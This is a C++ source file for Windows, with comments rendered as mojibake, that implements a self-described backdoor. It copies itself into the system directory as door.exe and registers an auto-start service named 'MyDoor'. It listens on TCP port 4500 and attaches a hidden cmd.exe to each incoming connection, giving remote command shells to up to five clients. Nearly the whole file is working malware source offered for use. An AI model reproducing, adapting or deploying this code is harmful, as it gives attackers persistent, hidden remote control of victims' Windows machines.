// autorun.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <winsock2.h>
#include <windows.h>
#include <Winsvc.h>
#include <stdio.h>
#include <string.h>
#pragma comment(lib, "ws2_32.lib")

SERVICE_STATUS        ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;

void WINAPI ServiceControl(DWORD dwCode)
{
    switch(dwCode)
    {
		//������ͣ
    case SERVICE_CONTROL_PAUSE:
        ServiceStatus.dwCurrentState = SERVICE_PAUSED;
        break;
		//�������
    case SERVICE_CONTROL_CONTINUE:
        ServiceStatus.dwCurrentState = SERVICE_RUNNING;
        break;
		//����ֹͣ
    case SERVICE_CONTROL_STOP:      
        ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
        ServiceStatus.dwWin32ExitCode = 0;
        ServiceStatus.dwCheckPoint    = 0;
        ServiceStatus.dwWaitHint      = 0;
		//���÷���״̬
        if(SetServiceStatus(ServiceStatusHandle,&ServiceStatus)==0)
        {
            OutputDebugString("SetServiceStatus in ServiceControl in Switch Error !\n");
        }
        return ;
    case SERVICE_CONTROL_INTERROGATE:
        break;
    default:
        break;
    }
	//���÷���״̬
    if(SetServiceStatus(ServiceStatusHandle,&ServiceStatus)==0)
    {
        OutputDebugString("SetServiceStatus in ServiceControl out Switch Error !\n");
    }
    return ;
}


DWORD WINAPI Thread( LPVOID lpParam )
{   
	SOCKET s=(SOCKET)lpParam;
	STARTUPINFO si;
	GetStartupInfo(&si);
    si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.wShowWindow=SW_HIDE;
	//ʹcmd���������ֱ�Ӻ�socket����
	si.hStdInput=si.hStdOutput=si.hStdError=(void*)s;
	char cmdline[256];
	//�õ�cmd·��
	GetSystemDirectory(cmdline,sizeof(cmdline));
	strcat(cmdline,"\\cmd.exe");
	PROCESS_INFORMATION ProcessInformation;
	int ret;
	//����cmd����
	ret=CreateProcess(NULL,cmdline,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
	//�ȴ����̽���
	WaitForSingleObject(ProcessInformation.hProcess,INFINITE);
	CloseHandle(ProcessInformation.hProcess);
	return 0;
}


DWORD WINAPI RunService(LPVOID lpParam)
{
	char wMessage[512] = "\r\n========================  BackDoor by �����ѩ  ========================\r\n";
	//����socket����
	SOCKET sClient[5];
    //��ʼ��socket�����Ҽ����˿�
	BYTE minorVer = 2; 
	BYTE majorVer = 2;
	WSADATA wsaData;
	WORD sockVersion = MAKEWORD(minorVer, majorVer);
	if(WSAStartup(sockVersion, &wsaData) != 0)
        return 0;
	SOCKET sListen = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if(sListen == INVALID_SOCKET)
	{
		printf("socket error \n");
		return 0;
	}
	//����socket����
	sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(4500);
	sin.sin_addr.S_un.S_addr = INADDR_ANY;
	
	if(bind(sListen, (LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
		printf("bind error \n");
		return 0;
	}
	//�����˿ڣ�����5��ʾ���ֻ�ܽ����������
	if(listen(sListen, 5) == SOCKET_ERROR)
	{
		printf("listen error \n");
		return 0;
	}
	DWORD dwThreadId;
	//ѭ�������ڽ������ӣ������ѭ��������ǰ��listen�����еĵڶ�������Ҫһ�£�
	//��Ϊֻ�ܽ���5�����ӣ�ѭ��һ�ν���һ�����ӣ�����ֻ��ѭ��5��
	for(int i=0;i<5;i++)
	{
		//��������
        sClient[i]  =accept(sListen,NULL,NULL);
		//����cmdshell����
		CreateThread(NULL,NULL,Thread,(LPVOID)sClient[i],0,&dwThreadId);
		//���ͻ�ӭ��Ϣ
		send(sClient[i],wMessage,strlen(wMessage),0);
	}
	return 0;
}



void WINAPI ServiceMain(DWORD dwArgc,LPTSTR *lpArgv)
{
    HANDLE    hThread;
	//��дSERVICE_STATUS �ṹ
    ServiceStatus.dwServiceType             = SERVICE_WIN32;
    ServiceStatus.dwCurrentState            = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted        = SERVICE_ACCEPT_STOP
		| SERVICE_ACCEPT_PAUSE_CONTINUE;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwWin32ExitCode           = 0;
    ServiceStatus.dwCheckPoint              = 0;
    ServiceStatus.dwWaitHint                = 0;
	//ע�������ƺ���
    ServiceStatusHandle=RegisterServiceCtrlHandler("MyDoor",ServiceControl);
    if(ServiceStatusHandle==0)
    {
        OutputDebugString("RegisterServiceCtrlHandler Error !\n");
        return ;
    }
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    ServiceStatus.dwCheckPoint   = 0;
    ServiceStatus.dwWaitHint     = 0;   
	//���÷���״̬
    if(SetServiceStatus(ServiceStatusHandle,&ServiceStatus)==0)
    {
        OutputDebugString("SetServiceStatus Error !\n");
        return ;
    }
	//���������߳�
    hThread=CreateThread(NULL,0,RunService,NULL,0,NULL);
    if(hThread==NULL)
    {
        OutputDebugString("CreateThread Error !\n");
    }
    return ;
}

int APIENTRY InstallService()
{
	SC_HANDLE        schSCManager;
    SC_HANDLE        schService;
    DWORD            dwErrorCode;
    SERVICE_STATUS   InstallServiceStatus;
    char SystemPath[256];
	char SelfFile[MAX_PATH];
	//�õ�ϵͳĿ¼·��
	GetSystemDirectory(SystemPath,sizeof(SystemPath));
	strcat(SystemPath,"\\door.exe");
	//�õ������ļ�·��
	GetModuleFileName (NULL, SelfFile, MAX_PATH);
	//��������ϵͳĿ¼
	if(!CopyFile(SelfFile,SystemPath,true))
		return 0;
	//�򿪷�����ƹ��������ݿ�
    schSCManager=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
	if(schSCManager==NULL)
    {
        printf("OpenSCManager Error !\n");
        return 0 ;
    }
    //��������
    schService=CreateService(schSCManager,"MyDoor","MyDoor",SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS,SERVICE_AUTO_START,
		SERVICE_ERROR_IGNORE,SystemPath,NULL,NULL,NULL,NULL,NULL); 
	//����ʧ��
    if(schService==NULL)
    {		
        dwErrorCode=GetLastError();
        if(dwErrorCode!=ERROR_SERVICE_EXISTS)
        {
            printf("CreateService Error !\n");
            CloseServiceHandle(schSCManager);
			return 0 ;
        }
		//����������
        else
        {
			//��������Ѵ�����򿪷���
            schService=OpenService(schSCManager,"MyDoor",SERVICE_START);
			//��ʧ��
            if(schService==NULL)
            {
				printf("OpenService Error !\n");              
                CloseServiceHandle(schSCManager);
                return 0 ;
            }
        }
    }
    //��������
    if(StartService(schService,0,NULL)==0)                         
    {   	 
        dwErrorCode=GetLastError();
		//������������
        if(dwErrorCode==ERROR_SERVICE_ALREADY_RUNNING)
        {
			printf("StartService Error !\n");
			CloseServiceHandle(schSCManager);  
			CloseServiceHandle(schService);
			return 0;
        }
    } 
	//��ѯ����״̬
    while(QueryServiceStatus(schService,&InstallServiceStatus)!=0)           
    {   //�����Ƿ��ڳ�ʼ���׶�
        if(InstallServiceStatus.dwCurrentState==SERVICE_START_PENDING)
        {
            Sleep(100);
        }
        else
        {
            break;
        }
    }
	//��ѯ����״̬������û�������ɹ�
    if(InstallServiceStatus.dwCurrentState!=SERVICE_RUNNING)
    {
        printf("Install service Failed");                   
    }
    else
    {
		printf("Install service Successed");     
    }
    CloseServiceHandle(schSCManager);
    CloseServiceHandle(schService);
    return 1 ;
}

int RemoveService()
{
	SC_HANDLE        schSCManager;
    SC_HANDLE        schService;
	SERVICE_STATUS NServiceStatus;
    //�򿪷�����ƹ��������ݿ�
	schSCManager=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
	if(schSCManager==NULL)
		return 0;
	//�򿪷���
	schService=OpenService(schSCManager,"MyDoor",SERVICE_ALL_ACCESS);
	if(schService==NULL)
		return 0;
    //��ѯ����״̬
	QueryServiceStatus(schService,&NServiceStatus);
	//��������������о�ֹͣ����
	if(NServiceStatus.dwCurrentState==SERVICE_RUNNING)
	{
		ControlService(schService,SERVICE_CONTROL_STOP,&NServiceStatus);	
	}
	//ɾ������
	if(DeleteService(schService))
	{
		printf("remove service Successed");	
		//�رմ򿪵ľ��
		CloseServiceHandle(schSCManager);
		CloseServiceHandle(schService);			
		return 0;
	}
	else
	{
		printf("remove service Failed");
		//�رմ򿪵ľ��
		CloseServiceHandle(schSCManager);
		CloseServiceHandle(schService);
		return 0;
	}
}

int main(int argc, char* argv[])
{
	SERVICE_TABLE_ENTRY DispatchTable[] =
	{
		//�����������ƺ���ڵ㣻
		{"MyDoor",ServiceMain},
			//SERVICE_TABLE_ENTRY�ṹ�����ԡ�NULL������
		{NULL    ,NULL    }
	};
	//���ӷ�����ƹ���������ʼ���Ƶ��ȳ����߳�
	StartServiceCtrlDispatcher(DispatchTable);
	if(argc==2)
	{
		if(!stricmp(argv[1],"-install"))
		{
			//��������
			InstallService();
		}
		if(!stricmp(argv[1],"-remove"))
		{
			//ɾ������
			RemoveService();
		}
	}	
	return 0;
}
